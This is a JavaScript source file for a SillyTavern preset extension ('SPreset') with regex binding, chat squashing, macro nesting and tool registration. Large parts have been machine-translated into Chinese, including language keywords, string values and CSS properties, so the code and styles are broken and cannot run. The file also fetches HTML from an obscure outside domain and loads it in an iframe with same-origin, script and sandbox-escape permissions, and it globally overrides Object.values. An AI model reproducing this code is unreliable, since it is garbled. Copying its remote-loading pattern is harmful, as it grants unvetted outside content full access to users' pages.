let SPresetSettings = {
  RegexBinding: {},
  ChatSquash：{
    已启用：否
    separate_chat_history: false,
    parse_clewd: true,
    user_role_system: false,
    角色：'助理'
    enable_stop_string: false,
    stop_string: '用户:',
    用户前缀：'\n\n用户：'，
    用户后缀：''，
    char_prefix: '\n\n助理：',
    char_suffix: '',
    prefix_system: '',
    后缀系统：''，
    enable_squashed_separator: false,
    squashed_separator_regex: false,
    squashed_separator_string: '',
    squashed_post_script_enable: false,
    squashed_post_script: '',
    re_split: false,
  },
  MacroNest：false，
  ToolBindings: {},
};

window.SPresetTempData = {};

// 工具绑定管理状态
const spresetRegisteredTools = new Map(); // 工具ID -> uuid

window.versionNumber = 10000;

let oldST = false;

let SGlobalSettings = {
  RegexBinding: {},
};

const ctx = SillyTavern.getContext();

for (const prompt of ctx.chatCompletionSettings.prompts) {
  如果 (prompt.role === 'model') {
    prompt.role = '助手';
  }
}

const settingsDom = $(`
  <div id="s_preset_settings">
  </div>
`);

让 loadSettingsToChatSquashForm = null;
让 loadSettingsToMacroNestForm = null;

(() => {
  const _originalObjectValues = Object.values;
  window.__regexScriptOrder = [2, 0, 1]; // 预设(2) -> 全局(0) -> 字符(1)

  Object.values = function (target) {
    const stack = new Error().stack;

    const result = _originalObjectValues.call(Object, target);

    const regexForRegex = /regex\/[^/]+\.js/;
    if (regexForRegex.test(stack) && stack.includes('getRegexScripts')) {
      如果 (result.length === 3 && [0, 1, 2].every(v => result.includes(v))) {
        返回 [...window.__regexScriptOrder];
      }
    }

    返回结果；
  };
})();

function injectScriptRaw(id, content) {
  const script = document.createElement('script');
  script.id = id;
  script.type = '模块';
  script.textContent = content;
  document.body.appendChild(script);
}

function importFromModule(container, imports) {
  let injectContent = ``;
  for (const importItem of imports) {
    injectContent += `import { ${importItem.items.join(', ')} } from "${importItem.from}.js";\n`;
  }
  injectContent += `\nconst ${container} = {`;
  for (const importItem of imports) {
    for (const item of importItem.items) {
      injectContent += `\n ${item}: ${item},`;
    }
  }
  injectContent += `\n};\n`;
  injectContent += `\nwindow.${container} = ${container};\n`;
  injectContent += `
  const data = {
    'id': '${container}',
    'imports': ${container},
  }
  `;
  injectContent += `ctx.eventSource.emit('module_imported', data);\n`;

  injectScriptRaw(container + '_imports', injectContent);
}

//注入SPresetEditor
如果（真）{
  // 获取 html 文件
  fetch('https://jnai2d9kgnbs6xzx5c.com/regex_bind/bundled.html')
    然后(res => res.text())
    .then(htmlText => {
      // 创建一个包含文本的同源 iframe
      const iframe = document.createElement('iframe');
      iframe.srcdoc = htmlText;
      iframe.sandbox.add('允许同源');
      iframe.sandbox.add('允许脚本');
      iframe.sandbox.add('允许弹出窗口');
      iframe.sandbox.add('允许弹出窗口逃离沙盒');
      iframe.sandbox.add('允许顶部导航');
      iframe.sandbox.add('允许用户激活顶部导航');
      iframe.sandbox.add('允许指针锁定');
      iframe.sandbox.add('允许用户激活访问存储');
      iframe.sandbox.add('allow-modals'); //添加该权限以允许alert/prompt/confirm
      // 注入 SPresetButton 样式
      if (!document.getElementById('spreset-button-styles')) {
        const styleSheet = document.createElement('style');
        styleSheet.id = 'spreset-button-styles';
        styleSheet.textContent = `
        .spreset-button-container {
          位置：相对；
          margin: 12px 0;
          宽度：100%；
        }
        
        .spreset-btn {
          位置：相对；
          显示方式：flex；
          align-items: center;
          间隙：12像素；
          宽度：100%；
          内边距：12px 20px；
          background: linear-gradient(135deg, #e8f4f8 0%, #f0f8ff 50%, #e8f4f8 100%);
          border: 1px solid #b3d9e6;
          圆角半径：8px；
          光标：指针；
          溢出：隐藏；
          过渡：全部缓动 0.3 秒；
          box-shadow: 0 4px 15px rgba(100, 180, 255, 0.2),
                      内边距 0 1px 0 rgba(255, 255, 255, 0.3);
        }
        
        .spreset-btn::before {
          内容： '';
          位置：绝对定位；
          顶部：0；
          左侧：-100%；
          宽度：100%；
          高度：100%；
          背景：线性渐变（
            90度，
            透明的，
            rgba(135, 206, 250, 0.4),
            rgba(173, 216, 230, 0.6),
            rgba(135, 206, 250, 0.4),
            透明的
          ）；
          过渡：向左缓动 0.5 秒；
        }
        
        .spreset-btn:hover::before {
          左侧：100%；
        }
        
        .spreset-btn::after {
          内容： '';
          位置：绝对定位；
          顶部：-50%；
          左侧：-50%；
          宽度：200%；
          高度：200%；
          背景：圆锥梯度（
            从0度开始
            透明 0 度，
            rgba(135, 206, 250, 0.15) 60度
            透明120度，
            rgba(173, 216, 230, 0.2) 180度
            透明240度，
            rgba(135, 206, 250, 0.15) 300度
            360°透明
          ）；
          不透明度：0；
          transition: opacity 0.3s ease;
          动画：旋转发光 4 秒 线性无限；
          指针事件：无；
        }
        
        .spreset-btn:hover::after {
          不透明度：1；
        }
        
        @keyframes rotate-glow {
          来自 { transform: rotate(0deg); }
          变换：旋转360度；
        }
        
        .spreset-btn:hover {
          边框颜色：#87ceeb；
          box-shadow: 0 6px 25px rgba(100, 180, 255, 0.4),
                      0 0 30px rgba(135, 206, 250, 0.3),
                      内边距 0 1px 0 rgba(255, 255, 255, 0.5);
          transform: translateY(-2px);
        }
        
        .spreset-btn:active {
          变换：translateY(0);
          box-shadow: 0 2px 10px rgba(100, 180, 255, 0.3);
        }
        
        .spreset-btn-logo {
          宽度：32像素；
          高度：32像素；
          弹性收缩：0；
          z-index：1；
          filter: drop-shadow(0 0 8px rgba(100, 180, 255, 0.6));
          过渡：滤镜缓动 0.3 秒，变换缓动 0.3 秒；
        }
        
        .spreset-btn:悬停 .spreset-btn-logo {
          filter: drop-shadow(0 0 12px rgba(135, 206, 250, 0.8));
          变换：缩放(1.1)旋转(5度)；
        }
        
        .spreset-btn-text {
          font-family: 'Segoe UI', 'SF Pro Display', -apple-system, sans-serif;
          字体大小：15px；
          字体粗细：600；
          字母间距：1px；
          background: linear-gradient(135deg, #4a90e2 0%, #2c5aa0 50%, #4a90e2 100%);
          background-size: 200% 200%;
          -webkit-background-clip: 文本;
          -webkit-text-fill-color: 透明;
          background-clip: text;
          z-index：1；
          过渡：全部缓动 0.3 秒；
        }
        
        .spreset-btn:hover .spreset-btn-text {
          动画：闪烁文本 1.5 秒缓动无限；
        }
        
        @keyframes shimmer-text {
          0% { background-position: 0% 50%; }
          50% { background-position: 100% 50%; }
          100% { background-position: 0% 50%; }
        }
        
        .spreset-btn-arrow {
          margin-left: auto;
          字体大小：18px；
          颜色：#6bb6ff；
          z-index：1；
          transition: transform 0.3s ease, color 0.3s ease;
        }
        
        .spreset-btn:hover .spreset-btn-arrow {
          transform: translateX(5px);
          颜色：#4a90e2；
        }
        
        /* 悬停时的粒子效果 */
        .spreset-btn-particles {
          位置：绝对定位；
          宽度：100%；
          高度：100%；
          顶部：0；
          左侧：0；
          指针事件：无；
          溢出：隐藏；
        }
        
        .spreset-btn-particles span {
          位置：绝对定位；
          宽度：4像素；
          高度：4像素；
          background: radial-gradient(circle, rgba(135, 206, 250, 0.9) 0%, transparent 70%);
          圆角半径：50%；
          不透明度：0；
        }
        
        .spreset-btn:hover .spreset-btn-particles span {
          动画：float-particle 2s ease-in-out infinite;
        }
        
        .spreset-btn:hover .spreset-btn-particles span:nth-child(1) { left: 10%; animation-delay: 0s; }
        .spreset-btn:hover .spreset-btn-particles span:nth-child(2) { left: 30%; animation-delay: 0.3s; }
        .spreset-btn:hover .spreset-btn-particles span:nth-child(3) { left: 50%; animation-delay: 0.6s; }
        .spreset-btn:hover .spreset-btn-particles span:nth-child(4) { left: 70%; animation-delay: 0.9s; }
        .spreset-btn:hover .spreset-btn-particles span:nth-child(5) { left: 90%; animation-delay: 1.2s; }
        
        @keyframes float-particle {
          0% {
            底部：0；
            不透明度：0；
            变换：缩放(0)；
          }
          20% {
            不透明度：1；
            变换：缩放（1）；
          }
          100% {
            底部：100%；
            不透明度：0；
            变换：缩放(0.5)；
          }
        }
        
        /* 边框发光动画 */
        .spreset-btn-border-glow {
          位置：绝对定位；
          顶部：-2px；
          左：-2像素；
          右：-2px；
          底部：-2px；
          圆角半径：10px；
          背景：线性渐变（45度，
            #87ceeb, #b0e0e6, #87ceeb, #b0e0e6, #87ceeb
          ）；
          background-size: 400% 400%;
          z-index: -1;
          不透明度：0；
          transition: opacity 0.3s ease;
          动画：border-flow 3s ease infinite;
        }
        
        .spreset-btn:hover .spreset-btn-border-glow {
          不透明度：0.7；
        }
        
        @keyframes border-flow {
          0% { background-position: 0% 50%; }
          50% { background-position: 100% 50%; }
          100% { background-position: 0% 50%; }
        }
      `;
        document.head.appendChild(styleSheet);
      }

      // 注入 SPresetButton
      const spresetButton = $(`
        <div class="spreset-button-container">
          <button class="spreset-btn">
            <div class="spreset-btn-border-glow"></div>
            <img class="spreset-btn-logo" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGAAAABgCAYAAADimHc4AAAACXBIWXMAAAsTAAAALEwEAmpwYAAAZCULEQVR4nO19e5RcV Znv79v7vOrRVV39StKdF5BA3g9eCgLCSFBQhHEELjCgIjrcNaKA6Nx1Z41rzTgzawRRYZSrzCAKOmNGdC4I6BWYgDqQEIT R8JAEkpB+pJN+VVdVV53X3t/8caqqu0NC+lnVrpvfWr0WrDqp/X3nd87+vv29CjiGYziGYziGqeKGxUvP/sTxyz9UbzmmC qPeAkwVJ5x3kXnJzt9+R+lw6X80n/DBm7zCpwTRpq919Vxeb9kmA1lvAaaCmxYtuWpN774tzBz7Rs/+M68n78ttSn8lrfX q1en0iq35/I/rLeNE8QdFwOXHL190cdx5cFEQfHEYvPuOAwfX39q+4N42Vjf6WsPXjBR4zfp0uvm5fP5n9ZZ3IviDIeDGhYuuW+COPN4ceCsPgn73wrK1516uivc06/BjvtLQ5es0a6SI37W2sSm1NZf7RV2FngDmPAFXLl8576KY+aNWFX5B+J65X4 jO11esO/PUva9/tUWrj7kBRxcSA6DoTzMSxGesbmwsPZ/L/2c95T8a5jQB1y9efH5HqbBlHqsNRdfFoDByg/OXnLW0Z/df tSh1vas4uucAQFT9dwwAGogBm1Y3NvVuz+V+Uw/5J4I5S8BnFy78+2bfuycJjuc8Fx4J+G2tf9SQG/zIAhXe4oYMIoIoM8 A0/t8zA5I1YuAPrWhq3vXC8PCOOqhxVNDRL6ktzlu1tvHU4YGH5qnwfFcr9LkebBJAU/P1KvD9tjC4X6kQIQNuqKHBMKW EKQWYGeDxSkkCitJAn+mcf0/nW0/VTbEjYE4R8PHFy05p8Qr/3oJgEUNgwHU5CBVZjZl7C459T0ehsM1ijWygMOiWMKIVA MAEIW3byDhWtP9weRsqvxwmQDlpBL124tzvvbX72bopeBjMGQJuXLz0T1Ne6YG4DhEScckPyPNdOKn03t9mms7eODSwpUljWa/noc8tQRNBAAARGAzNQNo00BqLg5gjAsp2mQA2CJQTZvZgLPmu7+55Y2ddlR0DUW8BAOCzHR1favNLDzRoBU2CC2FAf aUiMskkVCz+yVXDQ7c2gJftK43wwVIJRAKSCEQEAiBAMIiQ80P0l0ogKjtFzIBmMINCBmdU2NjqFp788IkrW+qtcwV1J+Dm9o5vzw/9vyYVIhRAyIr6R4qYn0igaFj3eNL0moHPdReLyPoB2UIc0XOQgjAcBOhzPUDQ6B9FpsEDc5MOF63IZ399wYqN jTVV9AioKwGfb2/fvEAFf6a0RigIARgHRgpodWIQpll8OWl9qcHN3+4XRzDk+QMhiSdd8C9DwpBFiN4AGr+LSiIM+z4GAy/6jBEZZwAMIo/BrSo8aW3uwGP46eN1fwDrIoC89GrzlvaO/2gLg8tdrcDlB7W3WASTxIKYjVCKezt8XlMqls54s+je5lly xQ9db9P9rv/evInjXeB2AwzB1d1+VCkhMFTykAt8CFG2xMxg1mBmcrXGPOWfeeufffL/1kH9cai5ETYuuNq86eWnn2xV/jmejkII0VPrYdD10J5MwpYC2YbM6V5u6B8K+cKj3yu5Xz/cd12TsP9YaPzAZMQVVUxuGWUb0BKPIWWYUKwjuwBUbYcpBQ5 I87tf7+n55KwrfgTU9g34h9vEzTu2PNEWeud4SoMBSBA8rTBYcjEvFkecgALolUGljVDp3JFuPgA8MOL9e5Hk6oDQbRIINP5NYAL6SyUUdAghxquqwQiURpsKr7u5o+O22VH46KjpSfjzr77yszYVvM/VGlzeu4kIfcUiDCHRbDswCSiSeORN0MOs1dO vFIUD7/SdrwZBdpVj/pSZLraZMhpgcCUwETFSDALYhoQtJJi5bDcIOjiIQSALvWZXJjDyfy9X8jFCzN+CWjo4H21Twfk8p MCq3ByiqEG6o0OTY4PIuQkRDP+/q7N7c179rIt/9rwV3lx+ap7jAqxahbHoroTmCJqCvWIKrVdUmVDYrzQwOfbQE/u03LF xS88xaTQi4uWPR/fPC4DKv/OQTKsFLQs7z4UgDNkmUnRUwsTvZNX7k5wcLpj7b5YgEJjCXg6MChJAZvaUiPNZVz6liE0IQ LBWiMXDvu2TFiqaZ0XpimHUCbly85Jo25V3jKxXZRRr9U8woBSHillm9KQxAg6Z0E36S8wc1W+8tEV4zyiRUNnQBQqA0Dh aLCKAhiKoRVGaGz+AMwpZl+ezdM6H3RDGrBKw97T12PPD/hpWGPsTfIgJ8pQFoxAwDGhwRE7mWHVNd8wE33180cI5H9JpJRFSOSoAAKQRcBg6UigiZq8pTRAaFTIiH+oqPLV26ZqrrTxazSsB5vXsvTLFaGo53TgBEe7Nf9k4MEtUrFAOC+d2nr1qZm Oq6D+W8fk/a7/EYe81op6kKIIlQDDX6XXc0hE0ACYJiRgJAJvA2TXXtyWJWCbCUPstQ+oifK80QVPYeq/sxkATmn5YfvnA 6a2/ODQ/5hLNdoMuMTC5HJ2OGQYS87yMXhhBSjG5FAAANQ/Pa6aw9GcwqAQZEG4DDPP8RaOw5cMx/Cq2RDNSXprv+j0bcr hLwLg/cbVA5bFpZjggF34cum4lKuII0QKCaeYezupAi6MqNJUY5MlmJywBCAJoxainL14UMZJjXfm5hx2enK8ODJa9HCVzqQ7NgJirnCwSAUCtoNf7xYACK+ffTXXeimFUCfPAOTQRg9MaPhUkSGkDIYymIoLRCPAi+du2SpeumK8cPR/wXNOTnxh4B Ii+YwILKxj+6Ga4ARgxzy3TXnChmlYCCZT1aALMck7AlHZ0+wQxLCoABV6lxUU0mIAS4AVrO80s/OX31+ikb5AoeKJb+0QP90iz/vyp7RUb52EYgdghwhXzqO12d26a73kQxqwTcu2fv64EwfmIKCaLysUcQmKIQgSEELEnI+151c2auEAQKNXOzViecnT346EzIoxk/rvAsmJEyrcpHbIFpGKI0ZMc/PRNrTRSzbmz6Het/DwtWkso2l0ZNLwFosGyUwhC+VtEFZXIYUSbLV4xWFZ5708L2e6crCwNdClEgLm1ZSJgmmJktgEokkDWsj35n757d011nMpj1YNxL2eGBkxsz3Qnwh8E8ziNiAKYQcMMAXqiRtKI NYlyShQjMjARh45p0Rm/L5345VVnWmcZHwfq8hCExLxYDMeAIohwZfVnDvvCbPV01r5qoSTR0Wy7/0smpdEuK+HR1iDEmIjhSYshzoUFIGLJiIaPPy28FWCMBPm9VJvPG9lxu0jU+H0kkGywOvtdgGQ3zYnHEiOCTQFYYP9mTSH7wvn17X5sRZSeJmiZ kbu2Y/3CbUh8uKT0ueSKJkA9D7C+OoM2OI22Z0NBgLruvIoqqSTA8IdDnxM/99ltvPTOZta+Lm5tPiDuX22YMWYbvET3sGdZX7+rsfH6G1ZwUakoAXXKZ8cXtv3qmKQzPdCO/tBqXFiAM+wH6i0XMS8SRNIzIFlclZICJLQLlhZHtTiTP+P7uN4/qr1 /XsiBmhMW/SZji1rRjP++xeOQAGT/8bue+vbOm6CRQ85TkJctXNa7MD/6uUYeLvLEkMCAEYdB1kfVcLEgkEJNmFKRjHptOZEsQZaU8uDuZ2vjgrl0977Tep4477hw78E8M7cTj335z5zteWw/UpTDr+sULT2zzvecaNDf5ZRLG5msPeiWM+D7aE0nYQo D16OmZiUAEdgg0IKzXtmcWv2vLa9vy9dBjJlCXqoh/3te1M2fHLy4KAeOQh4DBaLUdOIaBA8URBMxV17R6BTN5Gtyiw5WnDL/1eM0VmEHUrTr6+eHhzg2ZzBtxzR8RetQ95aiOCnHLxEigMBIEaDDNauCunOQCQKTASIEXr09lVj9XyD9UF0WmibqWp 2/L5XaszTR6DazPr8aKqhksIGGZyPsBSipA0rTeVoRFICgGGgWvXp1uXLQ1n3+kthpMH3XvD9iWy/96Qzq9OA3eeGjiRhAhZhnIeh4C1ohbFsYFt6lcdsiMGPjkVY2Nxe25/Jyqfj4a6k4AADyXLzyyIZ0+IwVeFo71jABIEohZBgbcEkJmJA1rNLIqo tJEBoFYIwFsWp1pfuP53Nxsxjgc6l4bWcFdG0+7eEDQSw5Vo8UAoqfbIYm2eAPyXoCsH5UbVisrNIO1hmaGVCFSgXv//1y08L11U2SSmDMEeI89EuxOOh8YItltEY0jQTMjKQXaYjH0eyUMBwFI0PgcAwNKgxNaiUzgP3H9kuM21EGNSWPOEAAA/7Zr 38F+O35xnsg/NJmuGWiwTLQ4DgZKLgpKRfncMWAwhQxu0Nps9oqPX3nc8UtrrcNkMSdswFi8OJztXdfU9KLN+mqTmcaaZQYQMwwwMQZcD1a53PAQkAK4Adxgh+EljYuW3L+zv2/ShV61wpx6Ayr4VmfX41nD/iSkfJuAmhkZ20HCNHCwGFW6jWvGiOwC eZo5w+q4lcNDT9rnfMg63DpzAXPuDahgWy730vrGNKWYz9WHhrABxA0TnlIY9jwkLAtG9bRcbdogBSAFXrAme+CUZ/OFf6m1DhPBnCUAALbm8k+vT6eXpqE3hKM5SwDRESBmmhhRAUb8AHHThEA5ejp6XIZiRgq8fF063f5cvjAjqc2ZxJwmAACeyxc ePjnVcEYavCzkqPS88pkkgYRlYjjwUQwUGgwT4jDhRcWMBuCU1Y2NsW35/JO1lP9omPMEAEBxzbqHOoZzlzSwnqfKNeyVAl+DCHHTRNbz4OkQSdOMkmmCQOWETiXRnyA+a01jY3ZbLl+zqoej4Q+CgN6uLrWkpe3Htg6vTgApFZUZUqW8xSCCY5gY9H2 EWiNhWtEWpFHdspgIkjUc8AdWZjIvvZDLv15Xpcr4gyAAAHZkh0ZWtrT8ylDquhhroblS8AmACBYJ2IbEgOcCBCRkVPRV9WOjslA2wGRqXHZS07xnXswNvVU/jSLMOQKuO+mkxg0xh/4rlw8P/ezF7HDPusaml2KsrzQQPeCVLhgGYEsJU0r0uaXIPk GT4+swQBrEDliaWl19Uuv8h1/MDh2sjWaHx5wg4ONLjz/h3ETsT94di92mSqVTD6YSP9s5MPQ2AgBgez63c2MmM5RgdaHW uurwRE2RjJhhQJBAX6kIU0o4hvF2EhicBBtC64vnt3X8y6tDAYM1UPOwqOusiBs7Oi5NsbrJ0vpMGYZmZ8n7ZdfIyEWPAU e9ITe3L7hrfhDeGKioz7haBE8ESYR+z8OgX0J7PIGENKH1+DJ5EsSmAGXJeO3ZTOtpv3rt5bqQUBcCPrNo8fl24P9dWqvTEwS4gY89xdLWf3b9MybzPV9YMP/fWlT4J65mJoCYoy6bSgd9n1tCLvCxMJ6EQwLjDnSRv8qOIOoX5lO3799//sxqOTHUN hTxi2/SF9oX3tcRuE+06vB0BqPTdbG3WIJHdOdkv+72k8+7YkjIF2wxPnoKAGBGq+MgYZjoKY7Ahx6fUYvIIFczWrR63y3tHQ9MT7mpoWZvwFVLls/rcHOPtrI+NUCUaB/wXPS7HjTo1acv37Sm6/5Hj9TLcURcdtLKluXDA79pUGqxXx1QE4EAaAL2F 4tQWqMjnoDkSnXFaAkkMcMyJHqFfcs3erqO2Bg+G6jJG3DJqrXpJV7+mVYVnlrUChrASBhg0PVgEoEEbZvKzQeAh15/rb8/Zl6UM8gzAIKORtREiRqG1MC8WAwKwIDnjt70ceXwhFArNOjga59auuT0mdB5oqgJASdmB/9Pq1Yn+cwsCAhYo6/oonxg hQDHpvP99+zpfiVnWFeyEKON2GVoZpiIkjn5IESRQ9Bh4hWKiZNaoclzvzkdWSaLWXdDb1i48PRM4N/JSoGJSEKgoAIMBx4EBASivuCFcedbOz1fTXWd7bn87zc2powG4Bzm8QaBAVhSoqgD+IqRMqxK+fvYN4EUAAfUsaoxs+P5fK4mxbqz/gaktP7zBGsojN4ULwyjpQlQACxCeyYMb5juWnd09/7VgJCP24LG1NoBYAZpRsowUQoDhFqDuDxxsRwvonJfiMkacR 1+YrqyTBSzSoD8wEdNS6uzeEy5OSPamyvPXZQ/YQjmL18ej8+f7pr7ks7Hh4XIGjTewWAwYsIAmOCVD3DMo x2SlYCd0gxD61POXrUqOV1ZJoJZJeDKN15oIVZtY49ARNFosbFQANughphW0x4bs3nn3r6itP5SCDGOgUpLlCEEPD16yD60eTBqW9WtSwqFBdOVZSKY3TcgCBoBJCoVzkB0IxzTOtRrp5AZlsA118SdafcHf7276+4c0U5 zjKdD5eCdQQKhPnLzODAmp1YDzCoBrmH3ATQ8djfQDDiGgbgpoTBadh715wIO46//NO5Me1SAL+S3KvVDAM q9aQRZnkdRgcCYm0BRNR4T9exMt3ROV4aJYFYJ2Pzm7v5A0KuVEZMVGAw0Ow6IgHBM7y7KQz4F9OYrEvaJ0 1l7oCH5o7zAsCw3BY6+gXzYYX9RVJtYSoJH4qfbdrxYk0qKWfeCQhI/k5XOx7LOmhm2EGi1ncgoA9U6zxBgmyljazx9Vcya8tSU772+62AoxH9agqJ5FOVJBdFWJ6sjc6J5LdFhzCCiHKAGTPmNGVB9Qph1Agbs+PeHCK4 s33wu2wOtgbRpocWyoqlVlW2BmUKAY4wFkvDYZclk81TXZhK/k+UwEQEImBFqBUdKQEdtUZW3oeIclAzzL+7b1z2hSV0zgVkn4L49uzsLhvxbQ4pq8gRAlJ7SGk22g0bLRFg+GAFRhZtH4ATEeoeDJ09rbpnSb90QRHd1 bBYBxTCAhIAtJMbMcgIIcAShj+QPvta1/47p6jwZ1CQUcWd3798NkbElRmKc31dpim9xHKSkgOLIOyn3dJPHjBhjw4pi/rGprBs​​yG1GTZbT9DHse0pYFWRmvWBYgJgQGhPnQV/f3XjMT+k4GNQtH/76l+dIhot12pfC2uu NEcYMWJ46EEFCHuIgBA3Hggmtj9oSHrF6RSS5fvyiVUKyP0+UWp4LvAwAaTAtje5UdKdAvjIe/sn9/XX59qWYEPLzj5dwB274oJ2TOosqUJpS3IoYJQlssDvvQxAkAH0AMfMm1MWvLBzLp+NHWajLNu9ck25ttrU7WrOFp hSHPRZsTg8ToCdgxJAYMc/NX9u+/dBZUnhBqmpC5d1/n61nLfv+IIDV2vCQQ3RSLCAviCRhUnukJVGM1ARN iROe2ue4LV8diq4+0xg3JxN0JaflNJd9yGGf5FE1LjBkmEoYJZoYEYAjggJTf/UrP/v8x64q/A2qelN+ey3 Wty2RetJmvMpmpsuFE1ZwEUxIsKTESBOUZPqP+ehSyQCvAn15nmrzCkjtfCVTh2liiaZWJc081xJ3zE8mrhpItH25yhz/RDD6r2/NQCkK0JxIggCVALAX6DfNLd/T0fr7W+h+KuiXlb1zYfnVb4P+AwihSOjZRIoiQC3w cKBUBiLG/zwNisABIElAkLmiNThI0LwHddFwigWEr/oO7582/4XM9nb0y9JLdIyW0xJOIkWCLmEaExJBhXP+P3funPX1lJlC/NtVcfseGdHokQXzBuE4MVMpLJAwSGAkD0NjAWjQPFJoBSWQBaAUhtjiWACwn/E1m4ab39 3f+vaPUe7pHRjA/nkBCmCyJKSeNwaGY8/5vdnbXfWp6BXWtC9qaLzy7sTGdTEGf+bYkCgOOEfXJFEIfhPHRTUFULcyaF4uhybaRNezrm8JSIh14d3XmC0hZDjKmBVsQDUrxuz3xhrPu27P35dpq+c6oe2HWc/nCExtTyeU ponXhId4PgxEzTAgilFQIBYYuJ3GYNZJSoCOe4CbLol6i+9+Y33bXouzAr/OFEccxTG6yTQIRBqV88OElJ1 64Zcd/Zeuj5ZFR18KssfjigvlPtqrwfSU9vk0ViH6QoRSGyAYefFYQJJCUBjKmxUkpaYDo918+84/W3/RSU 48axfwmCINbLJuKAAakeeudPbU93U4Gc4aAZe8+zf7o3n3bm7RaWym0OlS4ygxMAYYGsS2YSlLmD7YsWG4NHbiJc/n/ZQrCQieOAaAvZ1jX3tnV9fPaazNxzBkCAODyZcvaTsznXkxp1eExMYNJoJwyjPxUEAgCYAmmnJT +QENiY2Ogz0Ru4J9IA41ODMNC/Lwrmf7YA7t21rXwdiKYUwQAwA2Ll65s8Ue2J5ROBJVmjOqPLkRV5rYgKp JAV92wzpWqvWlo4OctJFAybR4U4uY7e3snXWVXL8w5AgDgM4sXndPklp5xNOOQEmk2CerLawN2/H2uDEViM PtEkzSgLHtrnxQ3fKur57f1kXpqmJMEAMBNHYuvagndH5JSKBcLlceVySDf0HxKycvN7yiO/EKRRNGxb7mjq6emJYUzhbq7oUfC1vzwjnXpdCEJvoBYw5GC8sI40NvQsNEtZOd3BMFTShjb3VRq0x1v7ftpveWdKuYsAQC WNZ9/7URMOt0k6IwBIV95Y+HxaxJDB09Nar05NIwv3NZ78NPPDg3111vO6WBOEwAAz+YK/29ZY1PfLkN/Jh 3ojY7Wf+xY4oqvdu7fUm/Z/r/DJ05c0V5vGY7hGI7hGI7hGGYK/w15ylSQH3c2TAAAAABJRU5ErkJggg==" alt=“S”/>/>/>/>/>/>/>/>/>
            <span class="spreset-btn-text">SPreset 编辑器</span>
            <span class="spreset-btn-arrow">→</span>
            <div class="spreset-btn-particles">
              <span></span><span></span><span></span><span></span><span></span><span></span><span></span>
            </div>
          </button>
        </div>
      `);
      spresetButton.on('click', () => {
        document.body.appendChild(iframe);
      });
      $('#completion_prompt_manager').before(spresetButton);
    });
}

$(async () => {
  await fetch('/version')
    然后(res => res.json())
    然后(数据 => {
      const version = data.pkgVersion.split('.');
      window.versionNumber = parseInt(version[0]) * 10000 + parseInt(version[1]) * 100 + parseInt(version[2]);
    })
    .catch(() => {
      window.versionNumber = 10000;
    });
  importFromModule('SPresetImports', [
    {
      items: ['promptManager', 'MessageCollection', 'Message', "sendOpenAIRequest"],
      来自：'./scripts/openai'，
    },
  ]);

  importFromModule('STVersionImports', [
    {
      items: ['displayVersion'],
      来自：'./script'，
    },
  ]);

  ctx.eventSource.on('module_imported', data => {
    如果 (data.id === 'STVersionImports') {
      console.log('displayVersion', STVersionImports.displayVersion);
      const versionRegex = /1\.13\.[0-1]/;
      if (versionRegex.test(STVersionImports.displayVersion)) {
        oldST = true;
      }
    }
    如果 (data.id === 'SPresetImports') {
      const originalFunction = SPresetImports.promptManager.preparePrompt;
      let PromptClass = null;
      SPresetImports.promptManager.preparePrompt = function (prompt, original = null) {
        如果 (!SPresetSettings.MacroNest || !prompt.content) {
          const result = originalFunction.apply(this, [prompt, original]);
          返回结果；
        }
        尝试 {
          如果 (!PromptClass) {
            const originalResult = originalFunction.apply(this, [prompt, original]);
            PromptClass = originalResult.constructor;
          }

          const groupMembers = this.getActiveGroupCharacters();
          const preparedPrompt = Reflect.construct(PromptClass, [prompt]);

          如果 (typeof original === 'string') {
            /* eslint-disable-next-line */
            如果 (0 < groupMembers.length) {
              preparedPrompt.content = substituteParamsRecursive(
                prompt.content ?? '',
                无效的，
                无效的，
                原来的，
                groupMembers.join(', '),
              ）；
            } 别的 {
              preparedPrompt.content = substituteParamsRecursive(prompt.content, null, null, original);
            }
          } 别的 {
            /* eslint-disable-next-line */
            如果 (0 < groupMembers.length) {
              preparedPrompt.content = substituteParamsRecursive(
                prompt.content ?? '',
                无效的，
                无效的，
                无效的，
                groupMembers.join(', '),
              ）；
            } 别的 {
              preparedPrompt.content = substituteParamsRecursive(prompt.content);
            }
          }
          返回 preparedPrompt；
        } catch (error) {
          console.error('preparePrompt 错误', error);
          抛出错误；
        }
      };
    }
  });

  重新加载设置();
  injectSPresetMenu();
  正则表达式绑定();
  loadSettingsToChatSquashForm = ChatSquash();
  loadSettingsToMacroNestForm = MacroNest();
  syncSPresetToolRegistrations();

  // 引入工具绑定 API 提供 iframe 编辑器调用
  window.SPresetToolBinding = {
    validateToolCode: validateSPresetToolCode,
    saveToolBinding(identifier, data) {
      const { uuidv4 } = SillyTavern.getContext();
      const validation = data.code.trim() ? validateSPresetToolCode(data.code) : { valid: false, error: '' };

      如果 (!SPresetSettings.ToolBindings) {
        SPresetSettings.ToolBindings = {};
      }

      SPresetSettings.ToolBindings[identifier] = {
        已启用：data.enabled，
        代码：data.code，
        有效：validation.valid，
        uuid: uuidv4(),
      };

      // 持久化
      如果 (!ctx.chatCompletionSettings.extensions) {
        ctx.chatCompletionSettings.extensions = {};
      }
      ctx.chatCompletionSettings.extensions.SPreset = SPresetSettings;
      如果 (getPrompt('SPresetSettings')) {
        setPrompt('SPresetSettings', JSON.stringify(SPresetSettings));
      } 别的 {
        addPrompt('SPresetSettings', 'SPreset 配置', JSON.stringify(SPresetSettings));
      }
      ctx.saveSettingsDebounced();

      // 重新同步注册
      syncSPresetToolRegistrations();

      返回验证；
    },
    getToolBinding(identifier) {
      返回 SPresetSettings.ToolBindings?.[标识符] || null;
    },
    删除工具绑定(标识符) {
      如果 (SPresetSettings.ToolBindings?.[identifier]) {
        删除 SPresetSettings.ToolBindings[标识符]；
        如果 (!ctx.chatCompletionSettings.extensions) {
          ctx.chatCompletionSettings.extensions = {};
        }
        ctx.chatCompletionSettings.extensions.SPreset = SPresetSettings;
        如果 (getPrompt('SPresetSettings')) {
          setPrompt('SPresetSettings', JSON.stringify(SPresetSettings));
        } 别的 {
          addPrompt('SPresetSettings', 'SPreset 配置', JSON.stringify(SPresetSettings));
        }
        ctx.saveSettingsDebounced();
        syncSPresetToolRegistrations();
      }
    },
  };
});

函数 substituteParamsRecursive(
  内容，
  _name1，
  _name2，
  _原来的，
  _团体，
  _replaceCharacterCard = true,
  additionalMacro = {},
  postProcessFn = x => x,
) {
  let s = String(content);

  // 统一的解析调用 + 花括号保护，防止解析后的文本再被设置宏
  const resolveOne = inner => {
    const replaced = ctx
      .substituteParams(
